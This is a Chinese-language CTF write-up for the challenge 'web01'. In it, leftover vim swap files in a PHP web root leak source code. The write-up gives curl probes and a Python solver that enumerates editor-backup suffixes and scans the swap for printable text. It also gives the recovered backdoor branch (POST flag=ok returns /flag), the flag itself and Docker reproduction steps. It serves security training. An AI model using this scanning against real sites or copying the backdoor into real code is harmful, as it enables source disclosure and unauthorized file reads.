# web01 · 编辑器 swap 残留文件泄露源码（vim swap 取证 + 源码后门）

| 项 | 值 |
|----|----|
| 轮次 | 环节二（13:30） |
| 平台题目名 | web01 |
| 比赛 qid | znIYXp9PSqJDvX43 |
| 分类 | web |
| 分值 | 500 |
| 交互型 | true（容器） |
| 关键 flag | `flag{6e0771cc-4c99-4eb8-abcf-1a826648ff84}` |
| 是否解出 | 已解出 |
| **还原完整度** | **B**（源码按分析重建 + 可部署；容器地址与 swap 二进制为重建件，考点与利用链忠实） |

## 1. 题面（比赛原文，逐字保留）

> 小明在服务器上直接编辑文件时，不小心意外退出环境。

题面只有这一句，没有任何其他提示。「意外退出环境」= **vim/vi 非正常退出**，
这是全题的钥匙；其余全部靠目录爆破与二进制取证。

## 2. 附件与环境

| 项 | 内容 |
|----|------|
| 附件 | **无附件**（`file_url` 为空串），纯容器题 |
| 容器 | `https://eci-2ze5h3h8k8ghqoet0une.cloudeci1.ichunqiu.com:80`（**会随平台 reset 变化**） |
| 附件存放 | `attachments/`（无原始附件，保留 `.gitkeep` 占位） |
| 部署件 | `deploy/`（php:7.4-apache + `tools/mk_swp.py` 生成真实布局的 swap） |

## 3. 考点（★核心）

- **考点 1 — 编辑器残留文件（dotfile）泄露**：vim 非正常退出会在被编辑文件的**同目录**
  留下 `.<filename>.swp` 交换文件（`.index.php.swp`、`.vi.php.swp`）；Web 服务器若未禁止
  访问点号开头的文件，攻击者可直接 HTTP 下载。同族需要一起扫的还有
  **`.swp / .swo / .swn / .bak / .old / ~ / .save / .orig / .un~`**（vim 的 `.swp/.swo/.swn`
  是"同名多实例"编号，emacs 是 `.#file` 与 `file~`，编辑器备份是 `.bak/.old/.save/.orig`）。
- **考点 2 — vim swap 的二进制布局与"必须裸扫"**：swap 头是 `b0VIM <ver>` + NUL 分隔的
  `user / hostname / 被编辑文件绝对路径`；**正文按 1024 字节块（BSIZE）存放被编辑文件的原始字节**，
  块头是 `struct block`（块号/块长度/前后指针）。因此源码常**跨 1024 字节边界**存放 ——
  **按块对齐切片再去扫会漏掉跨界那一段**，必须对整份文件做流式 **printable-run 裸扫**
  （连续可打印 ASCII 段，`[\x20-\x7e\r\n\t]{5,}`）。本题 WP 原文即强调："按块对齐扫描会漏数据"。
- **考点 3 — 源码里的隐藏后门参数分支**：还原出的 `/var/www/html/vi.php` 含一个
  非业务逻辑的分支 `if (@$_POST['flag'] == 'ok') { echo file_get_contents('/flag'); }`，
  即"看似无害的编辑残留"里藏着直读 flag 的后门。`@` 抑制错误、`$_POST` 直接比较字符串、
  `file_get_contents('/flag')` 硬编码路径 —— 三个特征都是典型 CTF 后门写法。

## 4. 设计思路（★核心）

- **为什么这样出**：把"信息泄露"从常见的 `.git/`、`.svn/`、`www.zip` 换成
  **编辑器运行时产物**。它比 `.git` 更隐蔽（不在任何脚手架里生成），但又完全符合真实事故场景：
  "运维直接在服务器上改文件、ssh 断了、swap 留在 Web 根" —— 一句题面就把场景交代完了。
- **难度卡点设计在哪**：卡在**"拿到 swap ≠ 拿到源码"**这一步。swap 是二进制，
  里面混着块头、时间戳、flags 等非可打印字节，且**被编辑的源码被 1024 字节块切开**。
  只会 `strings` 或按块对齐 grep 的人会看到"碎片"而以为文件损坏；
  只有理解 vim swap 的块结构、改用**裸扫可打印段**的人才能把源码拼出来。
- **干扰项 / 诱导项**：
  1. `/.index.php.swp` 与 `/.vi.php.swp` **都是 12288 字节**、都返回 200 ——
     `index.php` 是纯占位首页（`hello / nothing to see here`），扫到它会先浪费一轮；
     真正的后门在 `vi.php`。
  2. swap 头里写着被编辑文件的绝对路径 `/var/www/html/vi.php`，**诱导你直接去访问 `/vi.php`** ——
     这确实是正解路径之一，但必须先知道后门参数是 `flag=ok`，否则只会看到 `Invalid request`。
  3. 无附件（`file_url` 空）会让习惯"先下载附件"的人以为题目下发失败 ——
     其实是**纯容器题**，一切都得从目录爆破开始。
- **哪些地方是"必须踩坑才会发现"的**：
  - **必须裸扫**：按 1024 字节块对齐的扫描会漏掉跨块的源码片段（本题 swap 里
    `vi.php` 的内容正好跨块），拼出来的 PHP 会缺字符 → 后门参数名都读不出来。
  - **必须解析 swap 头**：`b0VIM 8.0` + 路径是从"这是哪个文件"到"源码是什么"的桥；
    不解析头就不知道残片属于 `vi.php` 还是 `index.php`。
  - **必须看 dotfile**：默认的目录字典（常见 `index.php` / `admin.php`）**不会**包含
    `.<name>.swp` 这种形态，必须显式构造后缀清单。

## 5. 解题路径（按真实过程，分步骤）

1. **侦察**：拿到容器地址，请求首页确认存活；构造编辑器残留清单并逐个探测：

   ```bash
   curl -sSI "https://<容器>:80/.index.php.swp"
   curl -sSI "https://<容器>:80/.vi.php.swp"
   # 命中：200 / Content-Type: application/octet-stream / Content-Length: 12288
   ```

2. **突破（取证）**：下载 swap，先验头再裸扫：

   ```python
   swp = requests.get(HOST + '/.vi.php.swp', verify=False).content
   assert swp.startswith(b'b0VIM')          # b0VIM 8.0 / xiaoming / web01 / /var/www/html/vi.php
   # ★ 裸扫可打印段（不按 1024B 块对齐）
   runs = re.findall(rb'[\x20-\x7e\r\n\t]{5,}', swp)
   code = [x for x in runs if b'$_POST' in x or b'file_get_contents' in x]
   ```

   还原结论：

   ```php
   <?php
   if (@$_POST['flag'] == 'ok') {
       $flag_content = file_get_contents('/flag');
       echo $flag_content;
   } else { echo "Invalid request"; }
   ```

3. **取 flag**：按还原出的分支直接打：

   ```bash
   curl -s -X POST "https://<容器>:80/vi.php" -d 'flag=ok'
   # -> flag{6e0771cc-4c99-4eb8-abcf-1a826648ff84}
   ```

## 6. 参考解法（代码）

```python
# solve/solve.py 核心片段（完整可跑，参数化 --target）
SWAP_SUFFIXES   = ['.swp', '.swo', '.swn']
BACKUP_SUFFIXES = ['.bak', '.old', '~', '.save', '.orig', '.un~', '.tmp', '.copy']
BASENAMES       = ['index.php', 'vi.php', 'flag.php', 'config.php', 'db.php']

def printable_runs(data: bytes, minlen: int = 5):
    """★ 裸扫连续可打印段：vim swap 按 1024B 块存原始字节，按块对齐会漏。"""
    out, cur = [], bytearray()
    for b in data:
        if 0x20 <= b < 0x7F or b in (0x09, 0x0A, 0x0D):
            cur.append(b)
        else:
            if len(cur) >= minlen: out.append(cur.decode('latin-1'))
            cur = bytearray()
    if len(cur) >= minlen: out.append(cur.decode('latin-1'))
    return out

m = re.search(r"\$_POST\['([^']+)'\]\s*==?\s*'([^']*)'", '\n'.join(printable_runs(swp)))
# m.group(1)='flag'  m.group(2)='ok'  ->  POST /vi.php  flag=ok
```

参见 `solve/solve.py`（含 dotfile 清单、swap 头解析、后门参数自动提取、`--submit`）。

## 7. Flag 与验证记录

| 项 | 值 |
|----|----|
| flag | `flag{6e0771cc-4c99-4eb8-abcf-1a826648ff84}` |
| 提交接口返回 | `code=0`，`status=null`，`message="恭喜您，回答正确"`，`pass=true`（题目 `is_solved` 变为 true） |
| 提交时间 | 2026-09-14 13:34:50 |
| 提交接口 | `/ff874ef3172cbf4fd6ec2c5653a568e2?token=&question_id=znIYXp9PSqJDvX43&answer=<flag>` |
| 证据文件 | `work/submit_results_live.json` 内该 qid 的回执；WP 原文 `work/_wp_dump/web01.txt` |
| 提交流水（含一次早期尝试） | 13:34:39 `flag{0fa830e7-...}` → 同样返回"回答正确"；13:34:50 `flag{6e0771cc-...}` → "回答正确"。两条都被平台判对（该题 flag 在多个容器实例间不唯一），本目录采用 WP 记录的 `6e0771cc` 作为该题目录的关键 flag。 |

## 8. 还原说明（诚实写）

- **已有原始件**：
  - 题面原文（来自 `challenges_live.json`，逐字一致）。
  - 容器地址（`connection.docker_url`）。
  - flag 与提交回执（平台已验证 `status=1`）。
  - 参考脚本 `work/web01/web01_solve_swp.py`、`work/web01/web01_solve.py`。
- **重建部分**：
  - **原始 swap 文件本身未归档**（比赛期间未落盘保存二进制）。`deploy/tools/mk_swp.py`
    按真实 vim swap 布局（`b0VIM 8.0` + NUL 元数据 + **1024 字节块** + `struct block` 头）
    **重新生成** `.vi.php.swp` / `.index.php.swp`，并自检"裸扫能完整还原源码"。
  - **`vi.php` / `index.php` 源码**按 WP 记录的还原结论重建（后门分支逐字一致）。
  - **比赛容器为 PHP + Apache**（`/var/www/html` 路径、`.swp` 可下载），部署件据此选
    `php:7.4-apache`；`.htaccess` 里显式放行 dotfile 是**为了让"未禁止访问点号文件"这个
    脆弱点可复现**（默认 Apache 的 `<FilesMatch "^\.">` 会挡掉 dotfile，那正是本题的修复建议）。
  - **`mk_swp.py` 生成的是"布局等价"的 swap，不是 vim 真实写出的二进制**
    （真实 swap 还含 undo 链、时间戳、块 0 的完整 `struct block0`）。这不影响考点：
    考点 2 要求的性质（**按 1024B 块存放 + 必须裸扫**）已完整复现。
- **未能还原**：原始 `.swp` 二进制、比赛容器的 Apache 版本/PHP 版本、`/flag` 的原始权限。
- **可复现性验证**（已实测）：

  ```bash
  # 1) 生成 docroot（源码 + 两个 swap）并自检
  cd deploy && python tools/build_docroot.py
  #   -> [OK] .vi.php.swp            2048B  magic=b'b0VIM 8.'  orig=/var/www/html/vi.php
  #      [OK] .index.php.swp         2048B  magic=b'b0VIM 8.'  orig=/var/www/html/index.php

  # 2) 起容器
  docker compose -f deploy/docker-compose.yml up -d --build

  # 3) 打靶
  python solve/solve.py --target http://127.0.0.1:8081
  #   -> .index.php.swp / .vi.php.swp -> 200 len=2048  <== HIT [vim swap, header=b0VIM]
  #      [/.vi.php.swp] 后门线索: POST[flag]=='ok' read=/flag
  #      POST /vi.php body=flag=ok -> 200 len=127  flag{local-r2-web01-swap-dotfile-leak}
  ```

- ⚠️ **重建件的一个硬约束（已踩过）**：`vi.php` / `index.php` 的**部署副本必须是纯 ASCII**。
  第一版我写了中文注释，结果 swap 里的源码被非 ASCII 字节切成碎片，
  printable-run 裸扫**无法完整还原**（`[FAIL]`）。所以 `deploy/src/*.php` 的注释一律用英文，
  `build_docroot.py` 会对"裸扫能否完整还原源码"做断言，不通过就报 FAIL。

## 9. 复现步骤

```bash
cd timu/round2_1330/web01

# ① 先在宿主机生成 docroot（swap 是二进制，Dockerfile 里跑不了 python：
#    php:7.4-apache 不带 python3，且 bullseye 的 apt 源在本机网络下频繁超时）
cd deploy && python tools/build_docroot.py && cd ..

# ② 起容器（本地映射端口 8081，避免与其它题的 8080/9999 冲突）
docker compose -f deploy/docker-compose.yml up -d --build

# ③ 打靶
python solve/solve.py --target http://127.0.0.1:8081
python solve/solve.py --target http://127.0.0.1:8081 --json    # 机读输出

# ④ 收工
docker compose -f deploy/docker-compose.yml down -v
```

> 复现要点：`tools/mk_swp.py` 生成的 swap **必须**同时满足"能裸扫出完整源码"与
> "源文件按 1024 字节块存放"，否则考点 2 就退化成普通 `strings`。
> `tools/build_docroot.py` 是唯一入口，它把两个 swap 写进 `deploy/docroot/` 并对还原性做断言。
